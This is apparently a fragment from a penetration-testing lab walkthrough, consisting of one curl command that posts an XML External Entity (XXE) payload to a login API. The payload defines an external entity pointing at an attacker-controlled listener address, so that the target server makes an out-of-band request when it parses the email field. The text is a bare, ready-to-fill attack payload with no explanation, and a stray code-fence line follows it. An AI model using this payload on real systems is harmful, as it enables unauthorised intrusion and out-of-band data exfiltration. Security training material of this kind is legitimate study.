curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```